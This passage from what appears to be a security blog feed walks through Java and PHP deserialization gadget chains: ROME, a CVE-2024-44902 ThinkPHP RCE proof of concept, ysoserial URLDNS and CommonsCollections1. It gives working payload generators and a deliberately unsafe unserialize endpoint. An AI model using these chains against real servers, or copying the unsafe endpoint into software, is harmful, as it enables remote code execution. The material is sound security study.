class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(h1,h1);<br>        hashMap.put(h2,h2);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(toStringBean,templatesimpl);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要两次put，因为第一次进入<code>putVal</code>的时候tab里面没有元素，导致不能进入else分支（equals所在的分支），需要执行<code>afterNodeInsertion</code>之后将键值对加入tab，所以需要第二次进入<code>putVal</code>。</p><img src="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" class=""><h4 id="payload缩短"><a class="markdownIt-Anchor" href="#payload缩短"></a> payload缩短</h4><p>使用Javassist生成的恶意类可以缩短payload，<a href="2024/08/29/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3">写法参考</a></p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><p><a href="https://xz.aliyun.com/t/12768">https://xz.aliyun.com/t/12768</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-44902</title>
    <link href="/2024/09/12/CVE-2024-44902/"/>
    <url>/2024/09/12/CVE-2024-44902/</url>
    
    <content type="html"><![CDATA[<h1 id="cve-2024-44902"><a class="markdownIt-Anchor" href="#cve-2024-44902"></a> CVE-2024-44902</h1><h2 id="vulnerability-description"><a class="markdownIt-Anchor" href="#vulnerability-description"></a> Vulnerability description</h2><p>A deserialization vulnerability in Thinkphp v6.1.3 to v8.0.4 allows attackers to execute arbitrary code.</p><h2 id="affects-version"><a class="markdownIt-Anchor" href="#affects-version"></a> Affects Version</h2><p>Thinkphp v6.1.3 to v8.0.4</p><h2 id="exploit-condition"><a class="markdownIt-Anchor" href="#exploit-condition"></a> Exploit condition</h2><p>The thinkphp framework should have installed the Memcached extension.</p><h2 id="vulnerability-certificate"><a class="markdownIt-Anchor" href="#vulnerability-certificate"></a> Vulnerability certificate</h2><ul><li>Test environment: php8.0.7+thinkphp8.0.4+memcached3.2.0.</li></ul><p>First, add new deserialization endpoint in app\controller\Index.php, such as:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">BaseController</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;style&gt;*&#123; padding: 0; margin: 0; &#125;&lt;/style&gt;&lt;iframe src=&quot;https://www.thinkphp.cn/welcome?version=&#x27;</span> . \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">version</span>() . <span class="hljs-string">&#x27;&quot; width=&quot;100%&quot; height=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;&lt;/iframe&gt;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP8&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello,&#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>You can generate payload from:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>=[];<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"></span>&#123;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [];<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$json</span> = [];<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$jsonAssoc</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-string">&quot;fru1ts&quot;</span>]=[<span class="hljs-string">&quot;whoami&quot;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;withAttr[<span class="hljs-string">&quot;fru1ts&quot;</span>]=[<span class="hljs-string">&quot;system&quot;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;json=[<span class="hljs-string">&quot;fru1ts&quot;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">route</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">DbManager</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ResourceRegister</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$registered</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$resource</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;registered=<span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;resource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">DbManager</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbManager</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$instance</span> = [];<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = [];<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&quot;connections&quot;</span>]=[<span class="hljs-string">&quot;getRule&quot;</span>=&gt;[<span class="hljs-string">&quot;type&quot;</span>=&gt;<span class="hljs-string">&quot;\\think\\cache\\driver\\Memcached&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>()]];<br>        <span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-string">&quot;default&quot;</span>]=<span class="hljs-string">&quot;getRule&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">route</span>\<span class="hljs-title">ResourceRegister</span>;<br><span class="hljs-variable">$r</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRegister</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$r</span>));<br><br></code></pre></td></tr></table></figure><p>Use the payload to deserialize can result to RCE:</p><img src="/2024/09/12/CVE-2024-44902/result.png" class="">]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ysoserial</title>
    <link href="/2024/09/07/ysoserial/"/>
    <url>/2024/09/07/ysoserial/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p>ysoserial是一款用于生成利用不安全Java对象反序列化的有效负载的概念验证工具。</p><p>下载：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar [payload] <span class="hljs-string">&#x27;[command]&#x27;</span> | <span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="urldns"><a class="markdownIt-Anchor" href="#urldns"></a> URLDNS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar URLDNS <span class="hljs-string">&quot;http://0a827c36.log.dnslog.biz&quot;</span> | <span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p>链子（主要是hashcode）</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>URL.<span class="hljs-function"><span class="hljs-title">hashCode</span>-&gt;</span>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>.hashcode-&gt;</span>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>.getHostAddress-&gt;</span>URL.<span class="hljs-function"><span class="hljs-title">getHostAddress</span>-&gt;</span>InetAddress.getByName<br></code></pre></td></tr></table></figure><p>getHostAddress从域名到ip肯定会做域名解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL,Integer&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;(); <span class="hljs-comment">//定义一个HashMap对象</span><br>        URL url=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://97092003.log.dnslog.biz&quot;</span>); <span class="hljs-comment">//定义一个URL对象</span><br>        Class c=url.getClass();<br>        Field hashcodefield=c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">// 更改hashcode的值为非-1，防止在put时就发送dns请求</span><br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        hashcodefield.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//将hashcode的值改回-1，这样才能使反序列化后能够触发getHostAddress</span><br>        serialize(hashMap);<br><span class="hljs-comment">//        deserialize();</span><br>        String ser=<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAFzYxYzA3M2U1LmxvZy5kbnNsb2cuYml6dAAAcQB+AAV0AARodHRwcHh0AB5odHRwOi8vNjFjMDczZTUubG9nLmRuc2xvZy5iaXp4&quot;</span>;<br>        deserialize(ser);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ObjectOutputStream oos= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><span class="hljs-comment">//    public static Object deserialize() throws Exception &#123;</span><br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="hljs-comment">//        return ois.readObject();</span><br><span class="hljs-comment">//    &#125;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        System.out.println(obj);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2024/09/07/ysoserial/2.jpg" class=""><h3 id="commons-collection-1"><a class="markdownIt-Anchor" href="#commons-collection-1"></a> Commons Collection 1</h3><p>影响版本：jdk&lt;8u71，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections1 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="transformedmap链"><a class="markdownIt-Anchor" href="#transformedmap链"></a> TransformedMap链</h4><p>链子（这条链不是和ysoserial完全一样的）主要是transform方法，ChainedTransformer可以任意反射调用。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>.setValue-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>.checkSetValue-&gt;</span>ChainedTransformer.transform<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt; ();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class c= Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Object object= constructor.newInstance(Retention.class,transformedMap);<br>        serializeBase(object);<br>        deserialize(serializeBase(object));<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serializeBase</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title 